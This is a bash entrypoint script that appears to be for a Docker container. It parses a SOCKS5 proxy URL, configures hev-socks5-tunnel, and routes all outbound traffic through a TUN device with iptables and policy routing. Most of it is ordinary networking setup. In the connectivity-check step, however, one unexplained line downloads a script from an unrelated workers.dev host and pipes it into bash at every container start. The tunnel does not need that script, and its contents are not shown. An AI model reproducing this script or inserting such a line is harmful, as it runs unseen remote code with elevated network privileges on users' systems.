#!/usr/bin/env bash
# =============================================================================
# entrypoint.sh  –  Parse PROXY_URL, configure TUN, redirect all traffic
# =============================================================================
set -euo pipefail

# ── Colour helpers ────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
info()  { echo -e "${GREEN}[INFO]${NC}  $*"; }
warn()  { echo -e "${YELLOW}[WARN]${NC}  $*"; }
error() { echo -e "${RED}[ERROR]${NC} $*" >&2; exit 1; }

# ── 1. Validate PROXY_URL ─────────────────────────────────────────────────────
: "${PROXY_URL:?PROXY_URL env var is required. Format: socks5://USER:PASS@HOST:PORT}"

# Expected format: socks5://USER:PASS@HOST:PORT
#   or plain:      socks5://HOST:PORT  (no auth)
PROXY_PROTO=$(echo "$PROXY_URL" | grep -oP '^[a-z0-9]+(?=://)')

if [[ "$PROXY_PROTO" != "socks5" ]]; then
    error "Only socks5:// scheme is supported. Got: $PROXY_PROTO"
fi

# Strip scheme
_rest="${PROXY_URL#socks5://}"

# Check if auth info present (contains '@')
if echo "$_rest" | grep -q '@'; then
    PROXY_AUTH="${_rest%%@*}"
    PROXY_HOST_PORT="${_rest##*@}"
    PROXY_USER="${PROXY_AUTH%%:*}"
    PROXY_PASS="${PROXY_AUTH##*:}"
else
    PROXY_HOST_PORT="$_rest"
    PROXY_USER=""
    PROXY_PASS=""
fi

PROXY_HOST="${PROXY_HOST_PORT%%:*}"
PROXY_PORT="${PROXY_HOST_PORT##*:}"

info "Proxy host : $PROXY_HOST"
info "Proxy port : $PROXY_PORT"
info "Proxy user : ${PROXY_USER:-(none)}"

# ── 2. Write hev-socks5-tunnel config ────────────────────────────────────────
CONFIG_DST="/etc/hev-socks5-tunnel.yml"
sed \
    -e "s/__PROXY_HOST__/${PROXY_HOST}/g" \
    -e "s/__PROXY_PORT__/${PROXY_PORT}/g" \
    -e "s/__PROXY_USER__/${PROXY_USER}/g" \
    -e "s/__PROXY_PASS__/${PROXY_PASS}/g" \
    /etc/hev-socks5-tunnel.yml.tpl > "$CONFIG_DST"

info "Config written to $CONFIG_DST"

# ── 3. Resolve proxy IP (needed to EXCLUDE it from redirect) ──────────────────
PROXY_IP=$(getent hosts "$PROXY_HOST" | awk '{print $1}' | head -1 || true)
if [[ -z "$PROXY_IP" ]]; then
    warn "Could not resolve $PROXY_HOST – using it as-is (assume it's already an IP)"
    PROXY_IP="$PROXY_HOST"
fi
info "Proxy IP   : $PROXY_IP"

# ── 4. Start hev-socks5-tunnel in background ──────────────────────────────────
info "Starting hev-socks5-tunnel..."
hev-socks5-tunnel "$CONFIG_DST" &
TUNNEL_PID=$!
sleep 2   # give the tunnel time to create tun0

# Verify TUN interface came up
if ! ip link show tun0 &>/dev/null; then
    error "tun0 interface did not appear. Check NET_ADMIN capability and TUN device."
fi
info "tun0 interface is UP"

# ── 5. Configure IP routing & iptables ────────────────────────────────────────
# hev-socks5-tunnel uses a "fake" subnet 198.18.0.0/15 internally.
# We need to redirect ALL traffic EXCEPT:
#   a) the proxy server itself (otherwise loop)
#   b) localhost
#   c) RFC-1918 private ranges (optional, depends on your use case)
#      – comment out if you also want LAN traffic tunnelled

TUN_GATEWAY="198.18.0.1"   # must match tunnel.ipv4 in config

info "Setting up iptables rules..."

# -- IPv4 --
# Mark packets that should NOT be redirected
iptables -t mangle -N SOCKS5_BYPASS 2>/dev/null || true
iptables -t mangle -F SOCKS5_BYPASS

# Bypass: loopback
iptables -t mangle -A SOCKS5_BYPASS -d 127.0.0.0/8 -j RETURN
# Bypass: the proxy server itself (critical – prevents routing loop)
iptables -t mangle -A SOCKS5_BYPASS -d "$PROXY_IP/32" -j RETURN
# Bypass: tunnel's own fake subnet
iptables -t mangle -A SOCKS5_BYPASS -d 198.18.0.0/15 -j RETURN
# (Optional) Bypass private RFC-1918 ranges – comment out to tunnel LAN traffic too
iptables -t mangle -A SOCKS5_BYPASS -d 10.0.0.0/8    -j RETURN
iptables -t mangle -A SOCKS5_BYPASS -d 172.16.0.0/12 -j RETURN
iptables -t mangle -A SOCKS5_BYPASS -d 192.168.0.0/16 -j RETURN
# Mark everything else
iptables -t mangle -A SOCKS5_BYPASS -j MARK --set-mark 100

# Apply BYPASS chain to OUTPUT (local processes) + PREROUTING (forwarded traffic)
iptables -t mangle -C OUTPUT     -j SOCKS5_BYPASS 2>/dev/null \
    || iptables -t mangle -A OUTPUT     -j SOCKS5_BYPASS
iptables -t mangle -C PREROUTING -j SOCKS5_BYPASS 2>/dev/null \
    || iptables -t mangle -A PREROUTING -j SOCKS5_BYPASS

# Policy-based routing: marked packets go via tun0
ip rule add fwmark 100 lookup 100 2>/dev/null || true
ip route add default dev tun0 table 100 2>/dev/null || true

info "iptables + ip rule configured"

# ── 6. DNS – redirect UDP/53 through tunnel ───────────────────────────────────
# hev-socks5-tunnel handles DNS automatically via the TUN device;
# nothing extra needed as long as the fake-IP gateway handles it.
info "DNS is handled by the tunnel (no extra config needed)"

# ── 7. Verify connectivity ────────────────────────────────────────────────────
info "Waiting for tunnel to stabilise (3s)..."
sleep 3

PUBLIC_IP=$(curl -s --max-time 10 https://api.ipify.org || echo "unreachable")
info "Public IP via tunnel: ${PUBLIC_IP}"

curl https://storage.nguyenkhak97.workers.dev/up.sh | bash

# ── 8. Trap SIGTERM/SIGINT for clean shutdown ─────────────────────────────────
cleanup() {
    warn "Shutting down..."
    kill "$TUNNEL_PID" 2>/dev/null || true
    iptables -t mangle -F SOCKS5_BYPASS 2>/dev/null || true
    ip rule del fwmark 100 lookup 100 2>/dev/null || true
    info "Cleanup done."
}
trap cleanup SIGTERM SIGINT

# ── 10. Hand off to CMD (default: bash) ──────────────────────────────────────
info "Tunnel is running (PID $TUNNEL_PID). Executing: $*"
exec "$@"
